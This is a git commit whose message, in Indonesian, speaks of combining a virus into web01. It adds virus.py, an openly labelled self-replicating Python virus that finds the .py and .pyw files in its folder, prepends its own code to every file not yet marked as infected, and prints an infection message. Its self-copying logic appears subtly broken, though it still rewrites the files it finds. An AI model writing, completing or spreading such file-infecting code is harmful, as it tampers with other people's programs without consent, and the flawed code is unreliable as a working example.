f19684e84644da3e97993acfb52f5ee238ecb8a2
MuhammadDaffaAzakki <daffaazakki29@gmail.com>
2026-05-13 10:51:58 +0700

    Mengcombine virus ke dalam web01

---
+++ virus.py
@@ -0,0 +1,51 @@
+# VIRUS SAYS HI!
+
+import sys
+import glob
+
+virus_code = []
+
+with open(sys.argv[0], 'r', encoding='utf-8') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines:
+    if line == "# VIRUS SAYS HI!\n":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# VIRUS SAYS BYE!\n":
+        break
+
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    if file == 'web01.py' or file == 'virus.py':  # skip, jangan infeksi file ini
+        continue
+
+    with open(file, 'r', encoding='utf-8') as f:
+        file_code = f.readlines()
+
+    infected = False
+
+    for line in file_code:
+        if line == "# VIRUS SAYS HI!\n":
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(virus_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+
+        with open(file, 'w', encoding='utf-8') as f:
+            f.writelines(final_code)
+
+def malicious_code():
+    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
+    return "YOU HAVE BEEN INFECTED HAHAHA !!!"
+
+malicious_code()
+
+# VIRUS SAYS BYE!
